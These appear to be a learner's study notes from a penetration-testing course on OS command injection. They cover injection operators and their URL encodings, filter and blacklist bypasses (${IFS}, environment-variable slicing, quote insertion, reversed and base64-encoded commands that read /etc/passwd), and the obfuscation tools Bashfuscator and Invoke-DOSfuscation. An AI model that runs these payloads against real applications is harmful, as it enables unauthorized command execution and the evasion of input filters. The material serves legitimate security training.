
    There are many types of injections found in web applications, depending on the type of web query being executed. The following are some of the most common types of injections:


    Injection 	                    Description

OS Command Injection 	    Occurs when user input is directly used as part of an OS command.

Code Injection 	            Occurs when user input is directly within a function that evaluates code.

SQL Injections 	            Occurs when user input is directly used as part of an SQL query.

Cross-Site Scripting/HTML Injection 	Occurs when exact user input is displayed on a web page.



    --Detection


    To inject an additional command to the intended one, we may use any of the following operators:


Injection Operator 	    Injection Character 	URL-Encoded Character 	        Executed Command
Semicolon 	                ; 	                        %3b 	                        Both

New Line 	                \n 	                        %0a 	                        Both

Background 	                 & 	                        %26 	                        Both (second output generally shown first)

Pipe 	                     | 	                        %7c 	                        Both (only second output is shown)

AND 	                     && 	                    %26%26 	                        Both (only if first succeeds)

OR 	                         || 	                    %7c%7c 	                        Second (only if first fails)

Sub-Shell 	                 `` 	                    %60%60 	                        Both (Linux-only)

Sub-Shell 	                 $() 	                    %24%28%29 	                    Both (Linux-only)



We can use any of these operators to inject another command so both or either of the commands get executed. We would write our expected input (e.g., an IP), then use any of the above operators, and then write our new command.



In general, for basic command injection, all of these operators can be used for command injections regardless of the web application language, framework, or back-end server. So, if we are injecting in a PHP web application running on a Linux server, or a .Net web application running on a Windows back-end server, or a NodeJS web application running on a macOS back-end server, our injections should work regardless.

If we  see that no new network requests were made when we clicked on the Check button, yet we got an error message. This indicates that the user input validation is happening on the front-end.




    --AND Operator

    $ ping -c 1 127.0.0.1 && whoami



    --OR Operator

    $ ping -c 1 127.0.0.1 || whoami

    If we try to use our usual payload with the || operator (127.0.0.1 || whoami), we will see that only the first command would execute


    Such operators can be used for various injection types, like SQL injections, LDAP injections, XSS, SSRF, XML, etc. We have created a list of the most common operators that can be used for injections:



    Injection Type 	                        Operators
    
    SQL Injection 	                        ' , ; -- /* */
    
    Command Injection 	                        ; &&
    
    LDAP Injection 	                          * ( ) & |
    
    XPath Injection 	                ' or and not substring concat count
    
    OS Command Injection 	                    ; & |
    
    Code Injection 	                    ' ; -- /* */ $() ${} #{} %{} ^
    
    Directory Traversal/File Path Traversal 	../ ..\\ %00
    
    Object Injection 	                            ; & |
    
    XQuery Injection 	                        ' ; -- /* */
    
    Shellcode Injection 	                    \x \u %u %n
    
    Header Injection 	                    \n \r\n \t %0d %0a %09




    ---Identifying Filters


    --Blacklisted Characters

    A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The PHP code may look something like the following:


    $blacklist = ['&', '|', ';', ...SNIP...];
    foreach ($blacklist as $character) {
        if (strpos($_POST['ip'], $character) !== false) {
            echo "Invalid input";
        }
    }


    --Bypass space blacklist

    (%0a = \n)

    127.0.0.1%0a whoami ---> error


    -Using Tabs

    127.0.0.1%0a%09whoami 


    -Using $IFS

    Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use ${IFS} where the spaces should be, the variable should be automatically replaced with a space, and our command should work.

    127.0.0.1%0a${IFS}


    --Using Brace Expansion

     automatically adds spaces between arguments wrapped between braces, as follows:

     $ {ls,-la}

    

    ---Slashes

    Besides injection operators and space characters, a very commonly blacklisted character is the slash (/) or backslash (\) character, as it is necessary to specify directories in Linux or Windows


    -Linux



    One such technique we can use for replacing slashes (or any other character) is through Linux Environment Variables like we did with ${IFS}. While ${IFS} is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specify start and length of our string to exactly match this character.

    For example, if we look at the $PATH environment variable in Linux, it may look something like the following:

    $ echo ${PATH}

    So, if we start at the 0 character, and only take a string of length 1, we will end up with only the / character, which we can use in our payload:

    $ echo ${PATH:0:1} 

    output ---> /

    $ echo ${LS_COLORS:10:1}

    output --->   ;


    127.0.0.1${LS_COLORS:10:1}${IFS}


    -Windows

    The same concept work on Windows as well. For example, to produce a slash in Windows Command Line (CMD), we can echo a Windows variable (%HOMEPATH% -> \Users\htb-student), and then specify a starting position (~6 -> \htb-student), and finally specifying a negative end position, which in this case is the length of the username htb-student (-11 -> \) 


    C:\htb> echo %HOMEPATH:~6,-11%

    We can achieve the same thing using the same variables in Windows PowerShell

    $env:HOMEPATH[0]



    --Character Shifting

    There are other techniques to produce the required characters without using them, like shifting characters. For example, the following Linux command shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with man ascii), then add it instead of [ in the below example. This way, the last printed character would be the one we need:

    $ echo $(tr '!-}' '"-~'<<<[)




    ---Bypassing Blacklisted Commands


    -Commands Blacklist

    -Linux

    One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there. Some of these characters are a single-quote ' and a double-quote ", in addition to a few others.

    $ w'h'o'am'i

    $ w"h"o"am"i
%0ai'd'
    We can insert a few other Linux-only characters in the middle of commands, and the bash shell would ignore them and execute the command. These characters include the backslash \ and the positional parameter character $@.

    $who$@ami

    $w\ho\am\i


    -Windows

    C:\htb> who^ami


    
    -Advanced Command Obfuscation%0ai'd'


    -Case Manipulation

    One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g. WHOAMI) or alternating between cases (e.g. WhOaMi). This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.

    However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. 

    $ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

    $(a="WhOaMi";printf %s "${a,,}")



    -Reversed Commands


    $ $(rev<<<'imaohw')

    Tip: If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.


    The same can be applied in Windows.

    PS C:\htb> "whoami"[-1..-20] -join ''

    PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"




    -Encoded Commands

    The final technique we will discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server.
    This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, we will try to create our own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. 

    We can utilize various encoding tools, like base64 (for b64 encoding) or xxd (for hex encoding)

    $ echo -n 'cat /etc/passwd | grep 33' | base64

    now we can create a command that will decode the encoded string in a sub-shell ($()), and then pass it to bash to be executed (i.e. bash<<<), as follows:


    $ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)


    Tip: Note that we are using <<< to avoid using a pipe |, which is a filtered character.



    -Windows

    PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

    We may also achieve the same thing on Linux, but we would have to convert the string from utf-8 to utf-16 before we base64 it, as follows:


    $ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

    PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"





    -Evasion Tools


    -Linux (Bashfuscator)

    $ git clone https://github.com/Bashfuscator/Bashfuscator
    $ cd Bashfuscator
    $ python3 setup.py install --user

    Once we have the tool set up, we can start using it from the ./bashfuscator/bin/ directory

    $ ./bashfuscator -c 'cat /etc/passwd'



    -Windows (DOSfuscation)

    PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
    PS C:\htb> cd Invoke-DOSfuscation
    PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
    PS C:\htb> Invoke-DOSfuscation










